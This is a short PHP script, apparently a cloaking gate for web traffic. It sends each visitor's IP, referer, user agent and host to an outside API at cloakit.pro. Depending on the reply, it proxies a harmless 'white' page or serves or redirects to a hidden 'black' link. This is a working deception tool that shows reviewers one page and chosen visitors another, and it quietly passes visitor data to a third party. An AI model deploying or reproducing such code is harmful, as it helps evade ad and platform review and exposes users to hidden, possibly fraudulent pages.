<?
  function getUserIP()
  {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
      $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
      $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
      $ip = $client;
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
      $ip = $forward;
    else
      $ip = $remote;

    return $ip;
  }
  $data = array(
     'ip' => getUserIP(), 
     "domain" => $_SERVER['HTTP_HOST'],
     'referer' => @$_SERVER['HTTP_REFERER'],
     'user_agent' => $_SERVER['HTTP_USER_AGENT'],
     'companyId' => '5ef714ace61ac8002150f2c3'
  );                                                                    
  $data_string = json_encode($data); 
 
  $curl = curl_init('https://app.cloakit.pro/api/check');
  
  curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");                                                                     
  curl_setopt($curl, CURLOPT_POSTFIELDS, $data_string );                                                                  
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);                                                                      
  curl_setopt($curl, CURLOPT_HTTPHEADER, array(                                                                          
     'Content-Type: application/json',                                                                                
     'Content-Length: ' . strlen($data_string))                                                                       
  );
  $json_reqest = curl_exec($curl);
  
  $api_reqest = json_decode($json_reqest);
  curl_close($curl);
 
  if(!@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0){
   $html = file_get_contents($api_reqest->white_link.'?'.$_SERVER['QUERY_STRING']);
   echo str_replace('<head>', '<head><base href="'.$api_reqest->white_link.'" />', $html);
 }else{
   if(@$api_reqest->blackTypeLoading == "loading"){
    $html = file_get_contents($api_reqest->link.'?'.$_SERVER['QUERY_STRING']);
    echo str_replace('<head>', '<head><base href="'.$api_reqest->link.'" />', $html);
   }else{
    if($_GET) $api_reqest->link .= '?'.http_build_query($_GET);
    echo '<meta http-equiv="refresh" content="0;'.$api_reqest->link.'">';
   }   
 }?>
